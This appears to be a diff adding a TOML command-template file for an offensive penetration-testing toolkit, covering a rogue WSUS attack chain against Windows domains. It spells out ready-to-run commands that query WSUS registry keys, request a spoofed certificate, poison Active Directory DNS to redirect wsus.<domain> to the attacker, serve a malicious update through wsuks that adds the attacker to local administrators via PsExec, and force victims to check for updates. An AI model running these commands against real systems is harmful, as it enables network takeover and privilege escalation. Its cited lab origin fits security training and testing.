@@ -1,0 +1,88 @@
+category = "wsus"
+display_name = "Rogue WSUS"
+icon = ""
+order = 52
+
+# Generic WSUS abuse: locate WSUS client config, poison DNS to point at attacker,
+# then run a rogue WSUS server (wsuks) that delivers a signed update payload.
+# See HTB Logging for the full chain.
+
+[[command]]
+id = "wsus.recon.regquery"
+title = "WSUS client regkeys (remote query)"
+template = "nxc smb {target} {nxc_auth} -x 'reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /s'"
+requires = ["nxc"]
+tags = ["recon", "wsus"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "wsus.recon.winrm"
+title = "WSUS regkeys via WinRM"
+template = "nxc winrm {target} {nxc_auth} -x 'reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /s'"
+requires = ["nxc"]
+tags = ["recon", "wsus"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "wsus.serve.cert_request"
+title = "certipy — request UpdateSrv-style cert"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template UpdateSrv -subject 'CN=wsus.{domain}' -altname 'wsus.{domain}'"
+requires = ["certipy-ad"]
+tags = ["wsus", "cert"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "wsus.serve.pemify"
+title = "Concatenate cert+key into wsus.pem"
+template = "cat wsus.cer wsus.key > wsus.pem && openssl x509 -in wsus.pem -noout -subject -ext subjectAltName"
+requires = ["openssl"]
+tags = ["wsus", "cert"]
+
+[[command]]
+id = "wsus.poison.dns"
+title = "dnstool — point wsus.<domain> at attacker"
+template = "python3 /opt/krbrelayx/dnstool.py -u '{domain}\\{user}' -p '{password}' -r wsus.{domain} -a add -d {lhost} -dns-ip {dc} -dc-ip {dc} {dc}"
+requires = ["python3"]
+tags = ["wsus", "dns"]
+when = "creds.kind == 'plaintext' and target.has_dc and target.has_lhost"
+
+[[command]]
+id = "wsus.serve.wsuks"
+title = "wsuks — rogue WSUS server (serve PsExec local admin add)"
+template = "sudo wsuks --serve-only --debug --tls-cert wsus.pem -I tun0 -c '/accepteula /s cmd.exe /c net localgroup administrators {domain}\\{user} /add' -e PsExec64.exe"
+requires = ["wsuks"]
+tags = ["wsus", "rogue"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "wsus.client.trigger_via_winrm"
+title = "Trigger Windows Update on victim (WinRM)"
+template = "nxc winrm {target} {nxc_auth} -x 'wuauclt /resetauthorization /detectnow /reportnow'"
+requires = ["nxc"]
+tags = ["wsus", "trigger"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "wsus.client.usoclient"
+title = "Trigger USOClient (modern Windows)"
+template = "nxc winrm {target} {nxc_auth} -x 'UsoClient StartInteractiveScan'"
+requires = ["nxc"]
+tags = ["wsus", "trigger"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "wsus.confirm.admin"
+title = "Confirm local admin was added"
+template = "nxc winrm {target} {nxc_auth} -x 'net localgroup administrators'"
+requires = ["nxc"]
+tags = ["wsus", "confirm"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "wsus.cleanup.dns"
+title = "Cleanup: remove DNS A record"
+template = "python3 /opt/krbrelayx/dnstool.py -u '{domain}\\{user}' -p '{password}' -r wsus.{domain} -a remove -dns-ip {dc} -dc-ip {dc} {dc}"
+requires = ["python3"]
+tags = ["wsus", "cleanup"]
+when = "creds.kind == 'plaintext' and target.has_dc"
